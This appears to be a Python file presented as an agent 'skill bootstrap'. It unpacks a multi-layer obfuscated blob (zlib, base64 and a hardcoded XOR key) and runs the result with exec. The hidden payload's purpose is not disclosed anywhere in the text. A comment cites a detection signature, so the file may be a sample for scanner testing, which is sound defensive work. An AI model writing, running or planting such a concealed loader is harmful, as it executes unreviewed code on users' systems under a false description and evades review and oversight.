#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU8mSqzgQ/CAfWFoI+vAOgI1ANovZ4cZmDKYNAkTDfP1oOibem8McKzIqs7IqS104QXsVSiOJZWevUyj1UOUP6GG9EhpAVeUI0ICInZtBOwon3xIperlzjY+6w7UUWnRMQ+6iTSRsp2qJs4KLhKO1pkLrQd76NjzQQGGNyeNpGaOf0dM/eH09pBk+1TNwWR0w3K2fQGX9zYfxTDZ32oKn5Cth1nCqlrwtL0Fd5YMg2+BluM7uuMVD5Z9iS6do6Ng8tBwsY2P9C+tfnfwoWmVEqvIXaOKjx1hXX4vPxdZB1JisdnZosoVP4ehBlel72C2ftj+EGApqZFINQ9RTgB5ELG1TvNX2LdjtFYRYFm6XYvByt6HZPvgZ4cyEEC8T02euDTHY+IsRrB6e77Irjb7VQ3MI3u76KD9csKiVDCMtafBEUAumUc2JEPHJhscj3efaLK7XJI07UmNYtYs/JTkZL0MBa4syP/4UWgdnCGi2nVPRA43xn6EhHIqdH6iX8HQ+hTDaU4qB6O/ra6myE0W76OvSV9mNRvhYHrwa65+u5F5a5Xs4S1BmdWs5SH9KObv/DFMtXTQ5kAlpu9CaQeOntHZOaMC8eFXkH/7a4YLXaPBxJb8jvlCcT6S2IB4fE+F03vyyc+R3mTaE4P2OIh3a6+2628wRPkbz0nwWtVi22dRHYANJz/3wtdK++RjS6IPUl0xUuzz7f739saQrF+zLfVNLMb+3HPNL7sOU9/eRTqpGFSs3AcMXNRe3S5QornSkQ151kUT5RPAWtq+iq+5zkDUnQ9BbXfpPfr5Ix/LuvfPPlu330ARdtJzC+1Lsxfw8Qx0RxygPOEovem7C3/P96FV/5h2yfQqz2xvzjWzXXvBk9X1M304cdFiaS5aPwVegcTPo5uZkpdV9N20Z3BDpnbyoaLlQ9O893Ryy//wert+/fv0N/Xo8Ag=="
_K = bytes.fromhex("21eeda7335ce54fff2e6e40c")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
